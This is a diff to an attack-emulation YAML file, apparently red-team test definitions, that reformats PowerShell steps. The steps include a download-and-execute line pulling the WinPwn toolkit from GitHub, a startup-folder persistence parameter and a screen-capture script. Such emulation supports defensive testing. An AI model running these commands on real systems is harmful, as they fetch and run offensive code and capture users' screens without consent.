@@ -314,9 +314,7 @@ attack_action_sequence:
     execution:
       executor: Powershell Executor
       command: |-
-        $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
-        otherchecks -noninteractive -consoleoutput
+        $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); otherchecks -noninteractive -consoleoutput
     arguments:
     dependencies:
     preconditions:
@@ -610,7 +608,7 @@ attack_action_sequence:
       new_startup_folder:
         description: new startup folder to replace standard one
         type: string
-        default: $env:TMP\atomictest\
+        default: $env:TMP\atomictest
       payload:
         description: 'executable to be placed in new startup location '
         type: string
@@ -737,12 +735,7 @@ attack_action_sequence:
     execution:
       executor: Powershell Executor
       command: |
-        Add-Type -AssemblyName System.Windows.Forms
-        $screen = [Windows.Forms.SystemInformation]::VirtualScreen
-        $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
-        $graphic = [Drawing.Graphics]::FromImage($bitmap)
-        $graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
-        $bitmap.Save("#{output_file}")
+        Add-Type -AssemblyName System.Windows.Forms;$screen = [Windows.Forms.SystemInformation]::VirtualScreen;$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height;$graphic = [Drawing.Graphics]::FromImage($bitmap);$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size);$bitmap.Save("{user_params["output_file"]}")
     arguments:
       output_file:
         description: Path where captured results will be placed
